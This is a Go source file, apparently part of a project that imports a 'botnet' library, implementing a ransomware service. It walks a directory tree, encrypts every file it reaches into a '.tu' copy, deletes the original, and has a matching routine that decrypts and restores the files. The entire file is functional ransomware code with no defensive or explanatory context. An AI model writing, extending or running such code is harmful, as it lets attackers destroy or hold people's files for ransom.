package ransom

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/pkg/errors"
	"github.com/threeaccents/botnet"
	"github.com/threeaccents/botnet/libs/sliceutil"
)

var ignoredFiles = []string{".DS_Store"}

type RansomService struct {
	CryptoService botnet.CryptoService
	Key           []byte
	InitialDir    string
}

func (s *RansomService) Run() error {
	return filepath.Walk(s.InitialDir, s.handleFileWalk)
}

func (s *RansomService) handleFileWalk(path string, info os.FileInfo, err error) error {
	// we can ignore directories
	if info.IsDir() {
		return nil
	}

	if sliceutil.Contains(ignoredFiles, info.Name()) {
		botnet.Msg("ignoring", path)
		return nil
	}

	f, err := os.OpenFile(path, os.O_APPEND|os.O_RDWR, os.ModeAppend)
	if err != nil {
		return errors.Wrap(err, "open file failed")
	}

	var buff bytes.Buffer
	if _, err := io.Copy(&buff, f); err != nil {
		return errors.Wrap(err, "copy file failed")
	}

	cipherText, err := s.CryptoService.EncryptToString(buff.Bytes())
	if err != nil {
		return errors.Wrap(err, "encrypt file failed")
	}

	encryptedFile, err := os.Create(fmt.Sprintf("%s.tu", path))
	if err != nil {
		return errors.Wrap(err, "creating encrypted file failed")
	}

	if _, err := io.Copy(encryptedFile, bytes.NewReader([]byte(cipherText))); err != nil {
		return errors.Wrap(err, "copying encrypted file failed")
	}

	os.Remove(path)

	botnet.Msg("encrypted", path)

	return nil
}

func (s *RansomService) Reverse() error {
	return filepath.Walk(s.InitialDir, s.handleDecrypteFile)
}

func (s *RansomService) handleDecrypteFile(path string, info os.FileInfo, err error) error {
	// we can ignore directories
	if info.IsDir() {
		return nil
	}

	if sliceutil.Contains(ignoredFiles, info.Name()) {
		botnet.Msg("ignoring", path)
		return nil
	}

	f, err := os.Open(path)
	if err != nil {
		return errors.Wrap(err, "open file failed")
	}

	var buff bytes.Buffer
	if _, err := io.Copy(&buff, f); err != nil {
		return errors.Wrap(err, "copy file failed")
	}

	plainText, err := s.CryptoService.DecryptString(buff.String())
	if err != nil {
		return errors.Wrap(err, "decrypt file failed")
	}

	decryptedFile, err := os.Create(fmt.Sprintf("%s", strings.Split(path, ".tu")[0]))
	if err != nil {
		return errors.Wrap(err, "creating decrypted file failed")
	}

	if _, err := io.Copy(decryptedFile, bytes.NewReader([]byte(plainText))); err != nil {
		return errors.Wrap(err, "copying decrypted file failed")
	}

	botnet.Msg("decrypted", path)

	os.Remove(path)

	return nil
}
